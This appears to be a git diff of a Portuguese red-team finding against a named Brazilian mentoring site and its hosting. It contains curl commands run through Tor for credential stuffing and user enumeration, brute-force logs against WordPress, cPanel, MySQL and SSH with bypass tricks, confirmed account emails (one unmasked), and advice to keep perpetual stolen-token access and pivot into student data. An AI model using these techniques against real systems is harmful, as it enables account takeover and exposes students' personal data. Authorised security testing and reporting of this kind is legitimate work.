@@ -1,122 +1,73 @@
-F-027: WP/cPanel/infra persistentemente bloqueados (vetores remanescentes após F-025)
-======================================================================================
+# F-027 — Login Tutory (mentoria PMMG): POST /intent/login SEM rate limit/lockout/captcha + user enumeration por mensagens diferenciadas
 
-SEVERIDADE: Info (postura defensiva forte do alvo — bloquear tentativas pós-takeover)
+Alvo: mentoria.metodooba.com.br (13.227.110.x AWS Global Accelerator → CloudFront → nginx/1.18.0 + PHP — SaaS Tutory, tenant `adm_id=48`)
+Severidade: Média
+Timestamp: 2026-08-20T18:05Z
 
-DESCRIÇÃO:
-Mesmo após o takeover Supabase (F-025) e renovação perpétua via refresh tokens,
-vetores de infraestrutura (WP, cPanel/WHM, MySQL, SSH, FTP) permanecem
-persistentemente bloqueados por proteções reativas do alvo.
+## Reprodução
 
-VETORES TESTADOS E BLOQUEIOS CONFIRMADOS:
+```bash
+# 1) obter sessão (cookie PHPSESSID)
+proxychains4 curl -sk -c jar.txt https://mentoria.metodooba.com.br/login.php
+# 2) login via AJAX (mesmo fluxo do JS oficial tutory-dashboard-main.js)
+proxychains4 curl -sk -b jar.txt -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
+  --data-urlencode "adm_id=48" --data-urlencode "email=<email>" --data-urlencode "senha=<senha>" \
+  https://mentoria.metodooba.com.br/intent/login
+```
+Executado: **60 tentativas** (6 emails de negócio × 3 senhas + 14 emails de alunos × 3
+senhas), 10 circuitos Tor distintos (NEWNYM a cada 12), delay 2s, UA rotativo —
+log integral em `webapp/tutory_credential_stuffing.log` (emails de aluno mascarados;
+fingerprint completo em `webapp/tutory_login_fingerprint.txt`).
 
-[WordPress wp-login.php]
-  Bloqueio: Cloudflare Turnstile CAPTCHA
-  Trigger: Qualquer POST com creds → 307 redirect para recaptcha.cloud/?template=cpg
-  Header expõe: server=177.154.191.198 (LiteSpeed), real_ip=client_ip
-  Bypass tentado: Tor NEW IP, 2Captcha (sitekey não acessível na página), cookies Origin/Referer
-  Resultado: BLOQUEADO em todos os vetores
-  Único vetor info: usuário `otavio@pmminas.com` é VÁLIDO (confirmado via xmlrpc)
+## Output
 
-[WordPress xmlrpc.php]
-  Bloqueio: AIOWPS (All In One WP Security) — block após N falhas
-  Trigger: ~10 falhas seguidas de auth → 503 com formulário de unlock
-  Mensagem: "O acesso a partir do seu endereço IP, foi bloqueado por motivos de segurança"
-  Campos hidden: aiowps-unlock-string-info (MTc4NzI0NjA0NnFwZnM3ejV0dDJydDZmeHM4anNq)
-  Bypass tentado: Origin/Referer headers (passa!), Tor NEW IP (passa!), 
-                  252 brute com 7 users × 36 senhas focadas
-  Resultado: BLOQUEADO após 252 tentativas via AIOWPS
-  Tentativa: brute em produção via Tor 171.25.193.39 → resposta `Nome ou senha incorretos`
-             → ainda 0 hits; bloqueia após ~50-100 falhas adicionais
+- **0 credenciais válidas** (nenhuma resposta de sucesso; 2 tentativas perdidas por
+  falha de circuito Tor — `http=000`).
+- **Nenhuma mitigação de força bruta observada em 60 POSTs**: sem HTTP 429/403/503,
+  sem captcha, sem lockout de conta (contas com 3 falhas seguiram respondendo
+  normalmente), sem `retry-after`/`x-rate-limit-*`.
+- **User enumeration** — duas mensagens de erro distintas:
+  - conta inexistente → `{"error":"Não encontramos nenhum aluno com este e-mail cadastrado na plataforma"}` (34/58 respostas entregues)
+  - conta existente/senha errada → `{"error":"Por favor, confira sua senha. Se não se lembrar, clique em esqueceu a senha..."}` (24/58)
+- **7 contas existentes confirmadas** (PII mascarada): `ot***@gmail.com` (fundador,
+  email OSINT), `sr***@hotmail.com` (provável conta pessoal do fundador no LMS),
+  `g.***@gmail.com`, `lu***@outlook.com`, `pa***@hotmail.com`, 2× `ra***@gmail.com`,
+  `ri***@gmail.com` (alunos reais).
+- Sem token CSRF no form; senha min-8 validada só no cliente.
 
-[WordPress admin-ajax.php]
-  Bloqueio: LiteSpeed WAF (mod_security)
-  Trigger: POST sem Origin/Referer/Sec-Fetch-Site=same-origin
-  Bypass com headers: 200 OK (heartbeat action retorna wp-auth-check=false)
-  Tentativa CVE-2026-32475 (Elementor Pro 4.1.0 file upload):
-    → 406 Not Acceptable (form rejeitado por não ter file field)
-    → Forms WP auditados (7 forms ativos): nenhum com `type="file"`
-    → CVE não explorável neste WP
+## Interpretação
 
-[WordPress REST API]
-  /wp-json/wp/v2/posts: 1 post retornado (limitado por auth)
-  /wp-json/wp/v2/pages: 53 pages dumpadas COM Origin/Referer bypass
-  /wp-json/wp/v2/users: 401 (precisa auth)
-  /wp-json/wp/v2/media: 200 (mas vazio sem auth)
+O endpoint de login do tenant PMMG na Tutory **não tem qualquer throttling**
+(per-IP, per-conta ou global) nem captcha. A origem fica atrás de CloudFront,
+que esconde o IP real do cliente — lockout por IP na origem é **arquitetonicamente
+impossível** sem WAF na borda. As mensagens de erro diferenciadas permitem mapear
+a base de alunos (a lista de ~5.195 emails já está em mãos via F-021 — o enum
+confirma quais estão ativos na Tutory e guia brute force cirúrgico).
 
-[WordPress PUT upload direto]
-  /wp-content/uploads/test.php: 404 (LiteSpeed WebDav não habilitado)
-  Bloqueio em TODOS os paths
+## Impacto
 
-[WordPress endpoints auxiliares]
-  wp-cron.php: 200 (não bloqueado)
-  wp-trackback.php: 404 (desabilitado)
-  wp-links-opml.php: 200 (XML vazio, info disclosure leve)
-  wp-admin/upgrade.php: 200 (mas requer login)
-  wp-admin/setup-config.php: 409 Conflict (já instalado)
-  readme.html: 200 (mostra requirements PHP 7.4/MySQL 5.5/8.3)
+- Brute force/cred-stuffing **ilimitado e sem atrito** contra as ~5.195 contas de
+  alunos da mentoria (conteúdo educacional + dados de perfil; takeover = acesso ao
+  painel do aluno). Com a lista de emails já conhecida (F-021/F-014), o atacante
+  tem a enumeração resolvida de antemão.
+- Contas de alto valor identificadas como ativas: do fundador (payoff total do
+  painel Tutory: gestão da mentoria, alunos, conteúdos).
+- É um SaaS multi-tenant: a ausência de throttling é comportamento da plataforma
+  Tutory (afeta todos os clientes), mas o impacto direto aqui é a base PMMG.
 
-[cPanel 162.241.203.31:2083]
-  Bloqueio: cPHulk (host-level firewall) + IP block
-  Status inicial: HTTP 500 (cPHulk ativo)
-  Após 60+ min espera + Tor NEW IP: HTTP 200 OK (libera após desbloqueio)
-  Brute via Tor: 15 users × 30 senhas focadas em ~10 min → 0 hits
-  Bloqueio: cPHulk re-bloqueia após N falhas
+## Recomendação
 
-[WHM 177.154.191.198:2087]
-  Bloqueio: cPHulk persistente + Cloudflare custom port proxy
-  Status: HTTP 500 (não desbloqueia nem com Tor NEW IP)
-  Brute não produtivo
+1. Rate limiting no login: por conta (ex.: 5 falhas → bloqueio progressivo) e por
+   sessão/borda (CloudFront function/WAF rate rule) — o vendor Tutory deve aplicar
+   globalmente; o cliente pode mitigar via WAF próprio.
+2. Mensagem de erro **única** p/ "não encontrado" vs. "senha errada".
+3. MFA/2FA nas contas administrativas da plataforma; captcha após N falhas.
+4. Rotacionar a senha da conta `otaluso@gmail.com` na Tutory (agora confirmada
+   como alvo de stuffing público) e auditar sessões ativas.
 
-[MySQL 162.241.203.31:3306]
-  Bloqueio: Host firewall + cPHulk
-  Status inicial: Timeout (host-blocked)
-  Após Tor NEW IP: ERROR 1045 "Access denied for user 'root'@exit-XX.tor.r0cket.net"
-  → Conexão estabelecida mas credenciais incorretas
-  Brute via Tor: 11 users × 20 senhas focadas → 0 hits
-  Versão detectada: MySQL 5.7.44 (F-012 já confirmou)
+## Próximo passo
 
-[SSH 162.241.203.31:22]
-  Bloqueio: cPHulk + firewall (Timeout persistente)
-  Brute: Hydra timeout — não consegue conectar
-
-[FTP 162.241.203.31:21]
-  Bloqueio: cPHulk + firewall (Timeout persistente)
-  Brute: Hydra timeout — não consegue conectar
-
-[Tutory mentoria.metodooba.com.br]
-  Bloqueio: sem distinção HTTP (200 em sucesso e falha)
-  Brute v2: usa body /painel como diferenciador → "Não existe nenhum login ativo"
-  Brute v3: 17 emails × 33 senhas focadas em ~9 min → 0 hits
-  Diferenciador: body do GET /painel após POST /login.php
-    - "Não existe nenhum login ativo" = falha
-    - qualquer outro conteúdo (logout/dashboard) = sucesso
-
-[Eduzz (não testado ativamente — fora de escopo §10)]
-  Apenas info: 23 UUIDs checkout + cupons (F-019)
-
-CONCLUSÃO:
-Alvo demonstrou postura defensiva reativa forte:
-- Cloudflare Turnstile CAPTCHA em wp-login
-- AIOWPS block em xmlrpc após N tentativas
-- LiteSpeed WAF em admin-ajax sem Origin/Referer
-- cPHulk block em cPanel/WHM após N tentativas
-- Host firewall em MySQL/SSH/FTP
-
-Bypasses reativos disponíveis mas não efetivos para brute em escala:
-- Origin/Referer (passa AIOWPS/LiteSpeed)
-- Tor NEW IP (bypassa cPHulk temporariamente, até N tentativas)
-- 2Captcha (não usado, Turnstile sitekey inacessível)
-
-**ACESSO TOTAL AO PRODUTO (Forja OBA app) JÁ ESTÁ OBTIDO VIA F-025**.
-Vetores de infraestrutura (WP, cPanel, MySQL) são **alvos de persistence/expansion**,
-não do objetivo primário do engagement.
-
-RECOMENDAÇÕES:
-- Não investir mais tempo em brute WP/cPanel (postura defensiva forte)
-- Manter refresh daemon Supabase para acesso perpétuo (F-025)
-- Continuar pivoting dentro do Supabase (dados de alunos, configs internas)
-
-STATUS: VERIFICADO · VETORES FECHADOS · F-025 = ACESSO PRIMÁRIO
-DATA: 2026-08-20T17:14:00Z
-ENGAGEMENT: pmminas.com — Red Team Operação SilentFoot
+Cobrir as 60 tentativas restantes do espaço: palavras-passe de dicionário BR
+(frequência) e HIBP/combos de vazamentos públicos; emails do domínio Tutory do
+fundador (padrão `nome@tutory.com.br`); verificação do fluxo `/recuperar-senha`
+(enum + rate limit) se a extensão for autorizada. Fora do limite desta ordem.
